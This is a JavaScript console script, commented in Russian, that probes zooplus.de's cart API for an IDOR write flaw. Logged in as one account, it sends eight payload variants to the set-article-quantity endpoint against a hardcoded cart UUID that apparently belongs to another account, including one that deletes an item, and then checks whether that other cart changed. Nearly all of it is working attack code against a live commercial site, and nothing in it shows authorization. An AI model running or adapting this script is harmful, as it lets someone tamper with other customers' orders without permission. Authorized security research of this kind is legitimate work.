// Автоматический тест всех вариантов payload для set-article-quantity
// Выполните в консоли браузера под Account B

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";

console.log("[*] Testing set-article-quantity endpoint with different payloads...");

fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
  credentials: 'include'
})
.then(r => r.json())
.then(cart => {
  window.beforeCount = cart.articles.length;
  window.beforeTotal = cart.summary.grandTotal;
  const articleId = cart.articles[0]?.id;
  console.log(`[+] Cart before: ${window.beforeCount} items, ${window.beforeTotal} EUR`);
  console.log(`[+] Testing with article ID: ${articleId}`);
  
  const payloads = [
    // Вариант 1: Стандартный формат
    { articleId: articleId, quantity: 2, cartUuid: CART_UUID },
    // Вариант 2: С sid вместо cartUuid
    { articleId: articleId, quantity: 2, sid: CART_UUID },
    // Вариант 3: С id вместо articleId
    { id: articleId, quantity: 2, cartUuid: CART_UUID },
    // Вариант 4: С qty вместо quantity
    { articleId: articleId, qty: 2, cartUuid: CART_UUID },
    // Вариант 5: С offerId
    { offerId: articleId, quantity: 2, cartUuid: CART_UUID },
    // Вариант 6: Только articleId и quantity
    { articleId: articleId, quantity: 2 },
    // Вариант 7: С cartId
    { articleId: articleId, quantity: 2, cartId: CART_UUID },
    // Вариант 8: Удаление (quantity: 0)
    { articleId: articleId, quantity: 0, cartUuid: CART_UUID },
  ];
  
  const tests = payloads.map((payload, i) => {
    console.log(`\n[*] Test ${i+1}:`, JSON.stringify(payload));
    return fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/set-article-quantity`, {
      method: "POST",
      credentials: "include",
      headers: {
        "Content-Type": "application/json",
        "Accept": "application/json"
      },
      body: JSON.stringify(payload)
    })
    .then(r => {
      const status = r.status;
      return r.text().then(text => {
        if (status === 200 || status === 201 || status === 204) {
          console.log(`  [!!!] SUCCESS! HTTP ${status}`);
          console.log(`  Response: ${text.substring(0, 200)}`);
          return { success: true, test: i+1, payload, status, response: text };
        } else {
          console.log(`  Failed: HTTP ${status}`);
          return { success: false, test: i+1, payload, status };
        }
      });
    })
    .catch(e => {
      console.log(`  Error: ${e.message}`);
      return { success: false, test: i+1, payload, error: e.message };
    });
  });
  
  return Promise.allSettled(tests);
})
.then(results => {
  console.log("\n[*] All tests completed. Checking cart...");
  return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  });
})
.then(r => r.json())
.then(cart => {
  const afterCount = cart.articles.length;
  const afterTotal = cart.summary.grandTotal;
  console.log(`\n[+] Cart after: ${afterCount} items, ${afterTotal} EUR`);
  
  if (afterCount !== window.beforeCount || Math.abs(afterTotal - window.beforeTotal) > 0.01) {
    console.log("\n[!!!] ========================================");
    console.log("[!!!] CRITICAL IDOR WRITE CONFIRMED!");
    console.log("[!!!] ========================================");
    console.log(`[!!!] Before: ${window.beforeCount} items, ${window.beforeTotal} EUR`);
    console.log(`[!!!] After:  ${afterCount} items, ${afterTotal} EUR`);
    console.log("[!!!] Account B successfully modified Account A's cart!");
    console.log("\n[!!!] Working endpoint:");
    console.log(`[!!!] POST /semiprotected/api/checkout/state-api/v2/set-article-quantity`);
  } else {
    console.log("[!] Cart unchanged - none of the payload formats worked");
    console.log("[!] Need to check exact payload from Network tab");
  }
})
.catch(e => console.error("[!] Error:", e));

